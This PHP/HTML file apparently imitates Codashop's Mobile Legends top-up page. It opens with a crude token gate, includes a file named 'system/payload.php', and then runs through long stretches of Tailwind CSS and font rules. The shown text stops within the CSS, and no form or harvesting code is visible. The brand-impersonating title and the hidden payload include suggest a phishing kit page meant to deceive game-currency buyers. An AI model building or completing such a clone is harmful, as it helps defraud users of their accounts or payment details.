<?php

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html dir="ltr" class=""><head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <title>Buy Mobile Legends | Up to 2x Bonus Diamonds | Codashop</title>
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="css/all.min.css">
<style> *,
:after,
:before {
  --tw-border-spacing-x: 0;
  --tw-border-spacing-y: 0;
  --tw-translate-x: 0;
  --tw-translate-y: 0;
  --tw-rotate: 0;
  --tw-skew-x: 0;
  --tw-skew-y: 0;
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  --tw-pan-x: ;
  --tw-pan-y: ;
  --tw-pinch-zoom: ;
  --tw-scroll-snap-strictness: proximity;
  --tw-gradient-from-position: ;
  --tw-gradient-via-position: ;
  --tw-gradient-to-position: ;
  --tw-ordinal: ;
  --tw-slashed-zero: ;
  --tw-numeric-figure: ;
  --tw-numeric-spacing: ;
  --tw-numeric-fraction: ;
  --tw-ring-inset: ;
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: rgba(59, 130, 246, 0.5);
  --tw-ring-offset-shadow: 0 0 #0000;
  --tw-ring-shadow: 0 0 #0000;
  --tw-shadow: 0 0 #0000;
  --tw-shadow-colored: 0 0 #0000;
  --tw-blur: ;
  --tw-brightness: ;
  --tw-contrast: ;
  --tw-grayscale: ;
  --tw-hue-rotate: ;
  --tw-invert: ;
  --tw-saturate: ;
  --tw-sepia: ;
  --tw-drop-shadow: ;
  --tw-backdrop-blur: ;
  --tw-backdrop-brightness: ;
  --tw-backdrop-contrast: ;
  --tw-backdrop-grayscale: ;
  --tw-backdrop-hue-rotate: ;
  --tw-backdrop-invert: ;
  --tw-backdrop-opacity: ;
  --tw-backdrop-saturate: ;
  --tw-backdrop-sepia: ;
  --tw-contain-size: ;
  --tw-contain-layout: ;
  --tw-contain-paint: ;
  --tw-contain-style: ;
}
::backdrop {
  --tw-border-spacing-x: 0;
  --tw-border-spacing-y: 0;
  --tw-translate-x: 0;
  --tw-translate-y: 0;
  --tw-rotate: 0;
  --tw-skew-x: 0;
  --tw-skew-y: 0;
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  --tw-pan-x: ;
  --tw-pan-y: ;
  --tw-pinch-zoom: ;
  --tw-scroll-snap-strictness: proximity;
  --tw-gradient-from-position: ;
  --tw-gradient-via-position: ;
  --tw-gradient-to-position: ;
  --tw-ordinal: ;
  --tw-slashed-zero: ;
  --tw-numeric-figure: ;
  --tw-numeric-spacing: ;
  --tw-numeric-fraction: ;
  --tw-ring-inset: ;
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: rgba(59, 130, 246, 0.5);
  --tw-ring-offset-shadow: 0 0 #0000;
  --tw-ring-shadow: 0 0 #0000;
  --tw-shadow: 0 0 #0000;
  --tw-shadow-colored: 0 0 #0000;
  --tw-blur: ;
  --tw-brightness: ;
  --tw-contrast: ;
  --tw-grayscale: ;
  --tw-hue-rotate: ;
  --tw-invert: ;
  --tw-saturate: ;
  --tw-sepia: ;
  --tw-drop-shadow: ;
  --tw-backdrop-blur: ;
  --tw-backdrop-brightness: ;
  --tw-backdrop-contrast: ;
  --tw-backdrop-grayscale: ;
  --tw-backdrop-hue-rotate: ;
  --tw-backdrop-invert: ;
  --tw-backdrop-opacity: ;
  --tw-backdrop-saturate: ;
  --tw-backdrop-sepia: ;
  --tw-contain-size: ;
  --tw-contain-layout: ;
  --tw-contain-paint: ;
  --tw-contain-style: ;
} /*! tailwindcss v3.4.18 | MIT License | https://tailwindcss.com*/
*,
:after,
:before {
  border: 0 solid #e5e7eb;
  box-sizing: border-box;
}
:after,
:before {
  --tw-content: "";
}
:host,
html {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  font-family: Inter, NotoSans-Regular, sans-serif;
  font-feature-settings: normal;
  font-variation-settings: normal;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  -webkit-tap-highlight-color: transparent;
}
body {
  line-height: inherit;
  margin: 0;
}
hr {
  border-top-width: 1px;
  color: inherit;
  height: 0;
}
abbr:where([title]) {
  -webkit-text-decoration: underline dotted;
  text-decoration: underline dotted;
}
h1,
h2,
h3,
h4,
h5,
h6 {
  font-size: inherit;
  font-weight: inherit;
}
a {
  color: inherit;
  text-decoration: inherit;
}
b,
strong {
  font-weight: bolder;
}
code,
kbd,
pre,
samp {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
    Liberation Mono, Courier New, monospace;
  font-feature-settings: normal;
  font-size: 1em;
  font-variation-settings: normal;
}
small {
  font-size: 80%;
}
sub,
sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}
sub {
  bottom: -0.25em;
}
sup {
  top: -0.5em;
}
table {
  border-collapse: collapse;
  border-color: inherit;
  text-indent: 0;
}
button,
input,
optgroup,
select,
textarea {
  color: inherit;
  font-family: inherit;
  font-feature-settings: inherit;
  font-size: 100%;
  font-variation-settings: inherit;
  font-weight: inherit;
  letter-spacing: inherit;
  line-height: inherit;
  margin: 0;
  padding: 0;
}
button,
select {
  text-transform: none;
}
button,
input:where([type="button"]),
input:where([type="reset"]),
input:where([type="submit"]) {
  -webkit-appearance: button;
  background-color: transparent;
  background-image: none;
}
:-moz-focusring {
  outline: auto;
}
:-moz-ui-invalid {
  box-shadow: none;
}
progress {
  vertical-align: baseline;
}
::-webkit-inner-spin-button,
::-webkit-outer-spin-button {
  height: auto;
}
[type="search"] {
  -webkit-appearance: textfield;
  outline-offset: -2px;
}
::-webkit-search-decoration {
  -webkit-appearance: none;
}
::-webkit-file-upload-button {
  -webkit-appearance: button;
  font: inherit;
}
summary {
  display: list-item;
}
blockquote,
dd,
dl,
figure,
h1,
h2,
h3,
h4,
h5,
h6,
hr,
p,
pre {
  margin: 0;
}
fieldset {
  margin: 0;
}
fieldset,
legend {
  padding: 0;
}
menu,
ol,
ul {
  list-style: none;
  margin: 0;
  padding: 0;
}
dialog {
  padding: 0;
}
textarea {
  resize: vertical;
}
input::-moz-placeholder,
textarea::-moz-placeholder {
  color: #9ca3af;
  opacity: 1;
}
input::placeholder,
textarea::placeholder {
  color: #9ca3af;
  opacity: 1;
}
[role="button"],
button {
  cursor: pointer;
}
:disabled {
  cursor: default;
}
audio,
canvas,
embed,
iframe,
img,
object,
svg,
video {
  display: block;
  vertical-align: middle;
}
img,
video {
  height: auto;
  max-width: 100%;
}
[hidden]:where(:not([hidden="until-found"])) {
  display: none;
}
[multiple],
[type="date"],
[type="datetime-local"],
[type="email"],
[type="month"],
[type="number"],
[type="password"],
[type="search"],
[type="tel"],
[type="text"],
[type="time"],
[type="url"],
[type="week"],
input:where(:not([type])),
select,
textarea {
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  background-color: #fff;
  border-color: #6b7280;
  border-radius: 0;
  border-width: 1px;
  font-size: 1rem;
  line-height: 1.5rem;
  padding: 0.5rem 0.75rem;
  --tw-shadow: 0 0 #0000;
}
[multiple]:focus,
[type="date"]:focus,
[type="datetime-local"]:focus,
[type="email"]:focus,
[type="month"]:focus,
[type="number"]:focus,
[type="password"]:focus,
[type="search"]:focus,
[type="tel"]:focus,
[type="text"]:focus,
[type="time"]:focus,
[type="url"]:focus,
[type="week"]:focus,
input:where(:not([type])):focus,
select:focus,
textarea:focus {
  outline: 2px solid transparent;
  outline-offset: 2px;
  --tw-ring-inset: var(--tw-empty);
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: #2563eb;
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
    var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
    calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  border-color: #2563eb;
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
    var(--tw-shadow);
}
input::-moz-placeholder,
textarea::-moz-placeholder {
  color: #6b7280;
  opacity: 1;
}
input::placeholder,
textarea::placeholder {
  color: #6b7280;
  opacity: 1;
}
::-webkit-datetime-edit-fields-wrapper {
  padding: 0;
}
::-webkit-date-and-time-value {
  min-height: 1.5em;
  text-align: inherit;
}
::-webkit-datetime-edit {
  display: inline-flex;
}
::-webkit-datetime-edit,
::-webkit-datetime-edit-day-field,
::-webkit-datetime-edit-hour-field,
::-webkit-datetime-edit-meridiem-field,
::-webkit-datetime-edit-millisecond-field,
::-webkit-datetime-edit-minute-field,
::-webkit-datetime-edit-month-field,
::-webkit-datetime-edit-second-field,
::-webkit-datetime-edit-year-field {
  padding-bottom: 0;
  padding-top: 0;
}
select {
  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
  background-position: right 0.5rem center;
  background-repeat: no-repeat;
  background-size: 1.5em 1.5em;
  padding-right: 2.5rem;
  -webkit-print-color-adjust: exact;
  print-color-adjust: exact;
}
[multiple],
[size]:where(select:not([size="1"])) {
  background-image: none;
  background-position: 0 0;
  background-repeat: unset;
  background-size: initial;
  padding-right: 0.75rem;
  -webkit-print-color-adjust: unset;
  print-color-adjust: unset;
}
[type="checkbox"],
[type="radio"] {
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  background-color: #fff;
  background-origin: border-box;
  border-color: #6b7280;
  border-width: 1px;
  color: #2563eb;
  display: inline-block;
  flex-shrink: 0;
  height: 1rem;
  padding: 0;
  -webkit-print-color-adjust: exact;
  print-color-adjust: exact;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  vertical-align: middle;
  width: 1rem;
  --tw-shadow: 0 0 #0000;
}
[type="checkbox"] {
  border-radius: 0;
}
[type="radio"] {
  border-radius: 100%;
}
[type="checkbox"]:focus,
[type="radio"]:focus {
  outline: 2px solid transparent;
  outline-offset: 2px;
  --tw-ring-inset: var(--tw-empty);
  --tw-ring-offset-width: 2px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: #2563eb;
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
    var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
    calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
    var(--tw-shadow);
}
[type="checkbox"]:checked,
[type="radio"]:checked {
  background-color: currentColor;
  background-position: 50%;
  background-repeat: no-repeat;
  background-size: 100% 100%;
  border-color: transparent;
}
[type="checkbox"]:checked {
  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0'/%3E%3C/svg%3E");
}
@media (forced-colors: active) {
  [type="checkbox"]:checked {
    -webkit-appearance: auto;
    -moz-appearance: auto;
    appearance: auto;
  }
}
[type="radio"]:checked {
  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E");
}
@media (forced-colors: active) {
  [type="radio"]:checked {
    -webkit-appearance: auto;
    -moz-appearance: auto;
    appearance: auto;
  }
}
[type="checkbox"]:checked:focus,
[type="checkbox"]:checked:hover,
[type="radio"]:checked:focus,
[type="radio"]:checked:hover {
  background-color: currentColor;
  border-color: transparent;
}
[type="checkbox"]:indeterminate {
  background-color: currentColor;
  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");
  background-position: 50%;
  background-repeat: no-repeat;
  background-size: 100% 100%;
  border-color: transparent;
}
@media (forced-colors: active) {
  [type="checkbox"]:indeterminate {
    -webkit-appearance: auto;
    -moz-appearance: auto;
    appearance: auto;
  }
}
[type="checkbox"]:indeterminate:focus,
[type="checkbox"]:indeterminate:hover {
  background-color: currentColor;
  border-color: transparent;
}
[type="file"] {
  background: unset;
  border-color: inherit;
  border-radius: 0;
  border-width: 0;
  font-size: unset;
  line-height: inherit;
  padding: 0;
}
[type="file"]:focus {
  outline: 1px solid ButtonText;
  outline: 1px auto -webkit-focus-ring-color;
}
@font-face {
  font-display: swap;
  font-family: NotoSans-Regular;
  src: local("NotoSans Regular"), local("NotoSans-Regular"),
    url(fonts/NotoSans-Regular.woff2)
      format("woff2"),
    url(fonts/NotoSans-Regular.woff)
      format("woff");
}
@font-face {
  font-display: swap;
  font-family: OTT;
  src: url(fonts/OTT_Ver2.woff2)
    format("woff2");
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_cyrillic_ext.woff2)
    format("woff2");
  unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f,
    u+fe2e-fe2f;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_cyrillic.woff2)
    format("woff2");
  unicode-range: u+0301, u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_greek_ext.woff2)
    format("woff2");
  unicode-range: u+1f??;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_greek.woff2)
    format("woff2");
  unicode-range: u+0370-03ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_vietnamese.woff2)
    format("woff2");
  unicode-range: u+0102-0103, u+0110-0111, u+0128-0129, u+0168-0169, u+01a0-01a1,
    u+01af-01b0, u+1ea0-1ef9, u+20ab;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter_ext.woff2)
    format("woff2");
  unicode-range: u+0100-024f, u+0259, u+1e??, u+2020, u+20a0-20ab, u+20ad-20cf,
    u+2113, u+2c60-2c7f, u+a720-a7ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 400;
  src: url(fonts/Inter.woff2)
    format("woff2");
  unicode-range: u+00??, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da,
    u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215,
    u+feff, u+fffd;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_cyrillic_ext.woff2)
    format("woff2");
  unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f,
    u+fe2e-fe2f;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_cyrillic.woff2)
    format("woff2");
  unicode-range: u+0301, u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_greek_ext.woff2)
    format("woff2");
  unicode-range: u+1f??;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_greek.woff2)
    format("woff2");
  unicode-range: u+0370-03ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_vietnamese.woff2)
    format("woff2");
  unicode-range: u+0102-0103, u+0110-0111, u+0128-0129, u+0168-0169, u+01a0-01a1,
    u+01af-01b0, u+1ea0-1ef9, u+20ab;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter_ext.woff2)
    format("woff2");
  unicode-range: u+0100-024f, u+0259, u+1e??, u+2020, u+20a0-20ab, u+20ad-20cf,
    u+2113, u+2c60-2c7f, u+a720-a7ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 600;
  src: url(fonts/Inter.woff2)
    format("woff2");
  unicode-range: u+00??, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da,
    u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215,
    u+feff, u+fffd;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_cyrillic_ext.woff2)
    format("woff2");
  unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f,
    u+fe2e-fe2f;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_cyrillic.woff2)
    format("woff2");
  unicode-range: u+0301, u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_greek_ext.woff2)
    format("woff2");
  unicode-range: u+1f??;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_greek.woff2)
    format("woff2");
  unicode-range: u+0370-03ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_vietnamese.woff2)
    format("woff2");
  unicode-range: u+0102-0103, u+0110-0111, u+0128-0129, u+0168-0169, u+01a0-01a1,
    u+01af-01b0, u+1ea0-1ef9, u+20ab;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter_ext.woff2)
    format("woff2");
  unicode-range: u+0100-024f, u+0259, u+1e??, u+2020, u+20a0-20ab, u+20ad-20cf,
    u+2113, u+2c60-2c7f, u+a720-a7ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 700;
  src: url(fonts/Inter.woff2)
    format("woff2");
  unicode-range: u+00??, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da,
    u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215,
    u+feff, u+fffd;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_cyrillic_ext.woff2)
    format("woff2");
  unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f,
    u+fe2e-fe2f;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_cyrillic.woff2)
    format("woff2");
  unicode-range: u+0301, u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_greek_ext.woff2)
    format("woff2");
  unicode-range: u+1f??;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_greek.woff2)
    format("woff2");
  unicode-range: u+0370-03ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_vietnamese.woff2)
    format("woff2");
  unicode-range: u+0102-0103, u+0110-0111, u+0128-0129, u+0168-0169, u+01a0-01a1,
    u+01af-01b0, u+1ea0-1ef9, u+20ab;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter_ext.woff2)
    format("woff2");
  unicode-range: u+0100-024f, u+0259, u+1e??, u+2020, u+20a0-20ab, u+20ad-20cf,
    u+2113, u+2c60-2c7f, u+a720-a7ff;
}
@font-face {
  font-display: swap;
  font-family: Inter;
  font-style: normal;
  font-weight: 800;
  src: url(fonts/Inter.woff2)
    format("woff2");
  unicode-range: u+00??, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da,
    u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215,
    u+feff, u+fffd;
}
.brand-heading-small {
  font-family: OTT, NotoSans-Regular, sans-serif;
  font-size: 24px;
  font-weight: 600;
  letter-spacing: 0.05em;
  line-height: 110%;
}
.subheading {
  font-size: 20px;
}
.subheading,
.subheading-small {
  font-weight: 600;
  line-height: 130%;
}
.subheading-small {
  font-size: 16px;
}
.body {
  font-weight: 400;
}
.body,
.body-action {
  font-size: 14px;
  line-height: 150%;
}
.body-action {
  font-weight: 600;
}
.caption {
  font-weight: 400;
}
.caption,
.caption-bold {
  font-size: 12px;
  line-height: 150%;
}
.caption-bold {
  font-weight: 600;
}
.eyebrow-small {
  font-size: 14px;
  line-height: 120%;
}
input[type="number"]::-webkit-inner-spin-button,
input[type="number"]::-webkit-outer-spin-button {
  -webkit-appearance: none;
  appearance: none;
}
.test {
  --tw-text-opacity: 1;
  color: rgb(239 68 68 / var(--tw-text-opacity, 1));
}
input.shake {
  animation: shake 0.2s ease-in-out 0s 2;
}
@keyframes shake {
  0% {
    margin-left: 0;
  }
  25% {
    margin-left: 0.5rem;
  }
  75% {
    margin-left: -0.5rem;
  }
  to {
    margin-left: 0;
  }
}
.visible {
  visibility: visible;
}
.invisible {
  visibility: hidden;
}
.static {
  position: static;
}
.\!fixed {
  position: fixed !important;
}
.fixed {
  position: fixed;
}
.absolute {
  position: absolute;
}
.relative {
  position: relative;
}
.inset-0 {
  inset: 0;
}
.inset-x-\[10px\] {
  left: 10px;
  right: 10px;
}
.bottom-0 {
  bottom: 0;
}
.end-\[12px\] {
  inset-inline-end: 12px;
}
.start-\[12px\] {
  inset-inline-start: 12px;
}
.start-\[16px\] {
  inset-inline-start: 16px;
}
.start-\[40px\] {
  inset-inline-start: 40px;
}
.top-0 {
  top: 0;
}
.top-1\/2 {
  top: 50%;
}
.top-\[4px\] {
  top: 4px;
}
.top-\[50px\] {
  top: 50px;
}
.z-10 {
  z-index: 10;
}
.z-30 {
  z-index: 30;
}
.z-50 {
  z-index: 50;
}
.z-\[200\] {
  z-index: 200;
}
.mx-4 {
  margin-left: 1rem;
  margin-right: 1rem;
}
.mx-\[4px\] {
  margin-left: 4px;
  margin-right: 4px;
}
.mx-\[8px\] {
  margin-left: 8px;
  margin-right: 8px;
}
.mx-auto {
  margin-left: auto;
  margin-right: auto;
}
.my-0 {
  margin-bottom: 0;
  margin-top: 0;
}
.my-1 {
  margin-bottom: 0.25rem;
  margin-top: 0.25rem;
}
.my-24 {
  margin-bottom: 6rem;
  margin-top: 6rem;
}
.my-4 {
  margin-bottom: 1rem;
  margin-top: 1rem;
}
.my-\[12px\] {
  margin-bottom: 12px;
  margin-top: 12px;
}
.my-\[14px\] {
  margin-bottom: 14px;
  margin-top: 14px;
}
.my-\[20px\] {
  margin-bottom: 20px;
  margin-top: 20px;
}
.my-\[32px\] {
  margin-bottom: 32px;
  margin-top: 32px;
}
.mb-6 {
  margin-bottom: 1.5rem;
}
.mb-8 {
  margin-bottom: 2rem;
}
.mb-\[10px\] {
  margin-bottom: 10px;
}
.mb-\[12px\] {
  margin-bottom: 12px;
}
.mb-\[8px\] {
  margin-bottom: 8px;
}
.me-3 {
  margin-inline-end: 0.75rem;
}
.me-\[12px\] {
  margin-inline-end: 12px;
}
.mr-\[-26px\] {
  margin-right: -26px;
}
.mr-\[12px\] {
  margin-right: 12px;
}
.mr-\[4px\] {
  margin-right: 4px;
}
.ms-5 {
  margin-inline-start: 1.25rem;
}
.ms-\[15px\] {
  margin-inline-start: 15px;
}
.ms-\[4px\] {
  margin-inline-start: 4px;
}
.mt-4 {
  margin-top: 1rem;
}
.mt-5 {
  margin-top: 1.25rem;
}
.mt-\[20px\] {
  margin-top: 20px;
}
.mt-\[4px\] {
  margin-top: 4px;
}
.mt-\[8px\] {
  margin-top: 8px;
}
.block {
  display: block;
}
.inline-block {
  display: inline-block;
}
.inline {
  display: inline;
}
.flex {
  display: flex;
}
.inline-flex {
  display: inline-flex;
}
.list-item {
  display: list-item;
}
.hidden {
  display: none;
}
.size-4 {
  height: 1rem;
  width: 1rem;
}
.size-5 {
  height: 1.25rem;
  width: 1.25rem;
}
.size-6 {
  height: 1.5rem;
  width: 1.5rem;
}
.size-\[18px\] {
  height: 18px;
  width: 18px;
}
.size-\[24px\] {
  height: 24px;
  width: 24px;
}
.size-\[72px\] {
  height: 72px;
  width: 72px;
}
.size-\[8px\] {
  height: 8px;
  width: 8px;
}
.h-0\.5 {
  height: 0.125rem;
}
.h-\[16px\] {
  height: 16px;
}
.h-\[24px\] {
  height: 24px;
}
.h-\[36px\] {
  height: 36px;
}
.h-fit {
  height: -moz-fit-content;
  height: fit-content;
}
.max-h-3 {
  max-height: 0.75rem;
}
.max-h-\[248px\] {
  max-height: 248px;
}
.max-h-\[50px\] {
  max-height: 50px;
}
.min-h-\[200px\] {
  min-height: 200px;
}
.min-h-\[45px\] {
  min-height: 45px;
}
.min-h-screen {
  min-height: 100vh;
}
.w-1\/2 {
  width: 50%;
}
.w-64 {
  width: 16rem;
}
.w-\[18px\] {
  width: 18px;
}
.w-\[20px\] {
  width: 20px;
}
.w-\[221px\] {
  width: 221px;
}
.w-\[24px\] {
  width: 24px;
}
.w-\[30px\] {
  width: 30px;
}
.w-\[328px\] {
  width: 328px;
}
.w-\[32px\] {
  width: 32px;
}
.w-\[42px\] {
  width: 42px;
}
.w-\[95\%\] {
  width: 95%;
}
.w-full {
  width: 100%;
}
.min-w-10 {
  min-width: 2.5rem;
}
.max-w-\[150px\] {
  max-width: 150px;
}
.max-w-\[450px\] {
  max-width: 450px;
}
.flex-1 {
  flex: 1 1 0%;
}
.flex-none {
  flex: none;
}
.shrink-0 {
  flex-shrink: 0;
}
.basis-full {
  flex-basis: 100%;
}
.-translate-y-1\/2 {
  --tw-translate-y: -50%;
}
.-translate-y-1\/2,
.translate-y-0 {
  transform: translate(var(--tw-translate-x), var(--tw-translate-y))
    rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y))
    scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.translate-y-0 {
  --tw-translate-y: 0px;
}
.translate-y-full {
  --tw-translate-y: 100%;
}
.rotate-180,
.translate-y-full {
  transform: translate(var(--tw-translate-x), var(--tw-translate-y))
    rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y))
    scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.rotate-180 {
  --tw-rotate: 180deg;
}
.scale-100 {
  --tw-scale-x: 1;
  --tw-scale-y: 1;
}
.scale-100,
.scale-95 {
  transform: translate(var(--tw-translate-x), var(--tw-translate-y))
    rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y))
    scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.scale-95 {
  --tw-scale-x: 0.95;
  --tw-scale-y: 0.95;
}
.transform {
  transform: translate(var(--tw-translate-x), var(--tw-translate-y))
    rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y))
    scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
@keyframes spin {
  to {
    transform: rotate(1turn);
  }
}
.animate-spin {
  animation: spin 1s linear infinite;
}
.cursor-pointer {
  cursor: pointer;
}
.resize {
  resize: both;
}
.grid-flow-row {
  grid-auto-flow: row;
}
.grid-flow-col {
  grid-auto-flow: column;
}
.flex-row {
  flex-direction: row;
}
.flex-col {
  flex-direction: column;
}
.flex-wrap {
  flex-wrap: wrap;
}
.items-center {
  align-items: center;
}
.justify-start {
  justify-content: flex-start;
}
.justify-center {
  justify-content: center;
}
.justify-between {
  justify-content: space-between;
}
.gap-1 {
  gap: 0.25rem;
}
.gap-6 {
  gap: 1.5rem;
}
.space-x-1 > :not([hidden]) ~ :not([hidden]) {
  --tw-space-x-reverse: 0;
  margin-left: calc(0.25rem * (1 - var(--tw-space-x-reverse)));
  margin-right: calc(0.25rem * var(--tw-space-x-reverse));
}
.overflow-hidden {
  overflow: hidden;
}
.overflow-y-auto {
  overflow-y: auto;
}
.truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.rounded {
  border-radius: 0.25rem;
}
.rounded-8 {
  border-radius: 8px;
}
.rounded-\[3px\] {
  border-radius: 3px;
}
.rounded-full {
  border-radius: 100px;
}
.rounded-xl {
  border-radius: 0.75rem;
}
.border {
  border-width: 1px;
}
.border-0 {
  border-width: 0;
}
.border-2 {
  border-width: 2px;
}
.border-\[0\.5px\] {
  border-width: 0.5px;
}
.border-t {
  border-top-width: 1px;
}
.border-dashed {
  border-style: dashed;
}
